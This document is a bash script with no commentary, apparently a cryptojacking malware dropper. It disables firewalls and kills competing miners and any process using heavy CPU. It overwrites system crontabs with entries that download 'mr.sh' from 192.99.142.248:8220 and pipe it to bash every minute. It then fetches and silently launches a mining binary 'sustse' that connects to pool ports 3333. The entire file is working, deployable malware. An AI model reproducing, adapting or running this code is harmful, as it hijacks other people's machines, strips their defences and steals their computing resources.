#!/bin/bash
mkdir /var/tmp
chattr -i /usr/bin/wget
chmod 755 /usr/bin/wget
chattr -i /usr/bin/curl
chmod 755 /usr/bin/curl
/etc/init.d/iptables stop
service iptables stop
SuSEfirewall2 stop
reSuSEfirewall2 stop
pkill -f sysxlj
pkill -f jourxlv
pkill -f sustes
touch /etc/ld.so.preload
netstat -antp | grep '56415' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '139.99.120.75' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
rm -rf /usr/lib/void.so
rm -rf /etc/voidonce.sh
rm -rf /usr/local/lib/libjdk.so
rm -rf /usr/local/lib/libntp.so
ps aux|grep "I2NvZGluZzogdXRmLTg"|grep -v grep|awk '{print $2}'|xargs kill -9
sed -i '$d' /etc/crontab
rm -rf /lib64/library1.so
rm -rf /usr/lib64/library1.so
iptables -I OUTPUT -s 167.99.166.61 -j DROP
iptables -I INPUT -s 167.99.166.61 -j DROP
iptables -I OUTPUT -p tcp -m string --string "pastebin" --algo bm -j DROP
iptables -I OUTPUT -p udp -m string --string "pastebin" --algo kmp -j DROP
rm -rf /etc/cron.monthly/oanacroner  
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.hourly/oanacroner
rm -rf /usr/local/bin/dns
echo "" > /etc/crontab
echo "" > /etc/cron.d/root
echo "" > /etc/cron.d/apache
echo "" > /var/spool/cron/root
echo "" > /var/spool/cron/crontabs/root
chkconfig --del netdns
pkill -f netdns
echo "" > /etc/cron.d/system
chmod 777 /var/tmp
rm -rf /usr/local/bin/dns
rm -rf /usr/sbin/netdns
rm -rf /etc/init.d/netdns
rm -rf /etc/cron.monthly/oanacroner  
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.hourly/oanacroner
chattr -i /usr/local/lib/libntpd.so
chmod 777 /usr/local/lib/libntpd.so
rm -rf /usr/local/lib/libntpd.so
sed -i '/libntpd.so/d'  /etc/ld.so.preload
crontab -l | sed '/pastebin.com/d' | crontab -
netstat -antp | grep '27.155.87.59' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '27.155.87.59' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'CLOSE_WAIT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
pkill -f /usr/bin/.sshd
netstat -antp | grep '158.69.133.20:3333'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
rm -rf /var/tmp/j*
rm -rf /tmp/j*
rm -rf /var/tmp/java
rm -rf /tmp/java
rm -rf /var/tmp/java2
rm -rf /tmp/java2
rm -rf /var/tmp/java*
rm -rf /tmp/java*
chattr -i /usr/lib/libiacpkmn.so.3 && rm -rf /usr/lib/libiacpkmn.so.3
chattr -i /etc/init.d/nfstruncate && rm -rf /etc/init.d/nfstruncate
rm -rf /etc/rc.d/rc*.d/S01nfstruncate /bin/nfstruncate
rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
rm -rf /tmp/*index_bak*
rm -rf /tmp/*httpd.conf*
rm -rf /tmp/*httpd.conf
rm -rf /tmp/a7b104c270
rm -rf /tmp/.uninstall* /tmp/.python* /tmp/.tables* /tmp/.mas
rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
echo -e "*/1 * * * * root (curl -s http://192.99.142.248:8220/mr.sh||wget -q -O - http://192.99.142.248:8220/mr.sh)|bash -sh\n##" > /etc/cron.d/root
echo -e "*/2 * * * * root (curl -s http://192.99.142.248:8220/mr.sh||wget -q -O - http://192.99.142.248:8220/mr.sh)|bash -sh\n##" > /etc/cron.d/apache
echo -e "*/30 * * * *	(curl -s http://192.99.142.248:8220/mr.sh||wget -q -O - http://192.99.142.248:8220/mr.sh)|bash -sh\n##" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo -e "* * * * *	(curl -s http://192.99.142.248:8220/mr.sh||wget -q -O - http://192.99.142.248:8220/mr.sh)|bash -sh\n##" > /var/spool/cron/crontabs/root
mkdir -p /etc/cron.hourly
(curl -fsSL --connect-timeout 120 http://192.99.142.248:8220/11 -o /etc/cron.hourly/oanacroner1||http://192.99.142.248:8220/11 -O /etc/cron.hourly/oanacroner1) && chmod 755 /etc/cron.hourly/oanacroner1
chmod 777 /var/tmp/sustse
ps aux | grep -vw 'kworkerds\|sustse' | awk '{if($3>30.0) print $2}' | while read procid
do
kill -9 $procid
done
ps ax | grep /tmp/ | grep -v grep | grep -v 'kworkerds\|sustse\|kworkerds\|sustse\|ppl' | awk '{print $1}' | xargs kill -9
ps ax | grep 'wc.conf\|wq.conf\|wm.conf' | grep -v grep | grep -v 'kworkerds\|sustse\|kworkerds\|sustse\|ppl' | awk '{print $1}' | xargs kill -9
netstat -ant|grep '192.99.142.232:80\|192.99.142.249:3333\|202.144.193.110:3333'|grep 'ESTABLISHED'|grep -v grep
if [ $? -eq 0 ]
then
pwd
else
curl http://192.99.142.248:8220/2mr.sh | bash -sh
fi
sleep 2
netstat -ant|grep '192.99.142.232:80\|192.99.142.249:3333\|202.144.193.110:3333'|grep 'ESTABLISHED'|grep -v grep
if [ $? -eq 0 ]
then
pwd
else
curl http://192.99.142.248:8220/3mr.sh | bash -sh
fi
DIR="/var/tmp"
if [ -a "/var/tmp/sustse" ]
then
    if [ -w "/var/tmp/sustse" ] && [ ! -d "/var/tmp/sustse" ]
    then
        if [ -x "$(command -v md5sum)" ]
        then
            sum=$(md5sum /var/tmp/sustse | awk '{ print $1 }')
            echo $sum
            case $sum in
                042b0568a6e42ed3d4a5520ada926164 | 042b0568a6e42ed3d4a5520ada926164)
                    echo "sustse OK"
                ;;
                *)
                    echo "sustse wrong"
                    pkill -f wc.conf
                    pkill -f sustse
                    sleep 4
                ;;
            esac
        fi
        echo "P OK"
    else
        DIR=$(mktemp -d)/var/tmp
        mkdir $DIR
        echo "T DIR $DIR"
    fi
else
    if [ -d "/var/tmp" ]
    then
        DIR="/var/tmp"
    fi
    echo "P NOT EXISTS"
fi
if [ -d "/var/tmp/sustse" ]
then
    DIR=$(mktemp -d)/var/tmp
    mkdir $DIR
    echo "T DIR $DIR"
fi
WGET="wget -O"
if [ -s /usr/bin/curl ];
then
    WGET="curl -o";
fi
if [ -s /usr/bin/wget ];
then
    WGET="wget -O";
fi
f2="192.99.142.248:8220"

downloadIfNeed()
{
    if [ -x "$(command -v md5sum)" ]
    then
        if [ ! -f $DIR/sustse ]; then
            echo "File not found!"
            download
        fi
        sum=$(md5sum $DIR/sustse | awk '{ print $1 }')
        echo $sum
        case $sum in
            042b0568a6e42ed3d4a5520ada926164 | 042b0568a6e42ed3d4a5520ada926164)
                echo "sustse OK"
            ;;
            *)
                echo "sustse wrong"
                sizeBefore=$(du $DIR/sustse)
                if [ -s /usr/bin/curl ];
                then
                    WGET="curl -k -o ";
                fi
                if [ -s /usr/bin/wget ];
                then
                    WGET="wget --no-check-certificate -O ";
                fi
                #$WGET $DIR/sustse https://transfer.sh/wbl5H/sustse
                download
                sumAfter=$(md5sum $DIR/sustse | awk '{ print $1 }')
                if [ -s /usr/bin/curl ];
                then
                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/sustse` > $DIR/var/tmp.txt
                fi
            ;;
        esac
    else
        echo "No md5sum"
        download
    fi
}

download() {
    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/sustse3 | awk '{ print $1 }')
        echo $sum
        case $sum in
            042b0568a6e42ed3d4a5520ada926164 | 042b0568a6e42ed3d4a5520ada926164)
                echo "sustse OK"
                cp $DIR/sustse3 $DIR/sustse
            ;;
            *)
                echo "sustse wrong"
                download2
            ;;
        esac
    else
        echo "No md5sum"
        download2
    fi
}

download2() {
    if [ `getconf LONG_BIT` = "64" ]
    then
        $WGET $DIR/sustse http://192.99.142.248:8220/tte2
    fi

    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/sustse | awk '{ print $1 }')
        echo $sum
        case $sum in
            042b0568a6e42ed3d4a5520ada926164 | 042b0568a6e42ed3d4a5520ada926164)
                echo "sustse OK"
                cp $DIR/sustse $DIR/sustse3
            ;;
            *)
                echo "sustse wrong"
            ;;
        esac
    else
        echo "No md5sum"
    fi
}

judge() {
    if [ ! "$(netstat -ant|grep '192.99.142.232:80\|192.99.142.249:3333\|202.144.193.110:3333'|grep 'ESTABLISHED'|grep -v grep)" ];
    then
        ps axf -o "pid %cpu" | awk '{if($2>=30.0) print $1}' | while read procid
	      do
	      kill -9 $procid
        done
        downloadIfNeed
        touch /var/tmp/123
        pkill -f /var/tmp/java
        pkill -f w.conf
        chmod +x $DIR/sustse
        $WGET $DIR/wc.conf http://$f2/wt.conf
        nohup $DIR/sustse -c $DIR/wc.conf > /dev/null 2>&1 &
        sleep 5
    else
       echo "Running"
    fi
}

judge2() {
    if [ ! "$(ps -fe|grep 'sustse'|grep 'wc.conf'|grep -v grep)" ];
    then
        downloadIfNeed
        chmod +x $DIR/sustse
        $WGET $DIR/wc.conf http://$f2/wt.conf
        nohup $DIR/sustse -c $DIR/wc.conf > /dev/null 2>&1 &
        sleep 5
    else
        echo "Running"
    fi
}

if [ ! "$(netstat -ant|grep 'LISTEN\|ESTABLISHED\|TIME_WAIT'|grep -v grep)" ];
then
    judge2
else
    judge
fi

if crontab -l | grep -q "192.99.142.248:8220"
then
    echo "Cron exists"
else
    crontab -r
    echo "Cron not found"
    LDR="wget -q -O -"
    if [ -s /usr/bin/curl ];
    then
        LDR="curl";
    fi
    if [ -s /usr/bin/wget ];
    then
        LDR="wget -q -O -";
    fi
	(crontab -l 2>/dev/null; echo "* * * * * $LDR http://192.99.142.248:8220/mr.sh | bash -sh > /dev/null 2>&1")| crontab -
fi
rm -rf /var/tmp/jrm
rm -rf /tmp/jrm
pkill -f 185.222.210.59
pkill -f 95.142.40.81
pkill -f 192.99.142.232
chmod 777 /var/tmp/sustse
crontab -l | sed '/185.222.210.59/d' | crontab -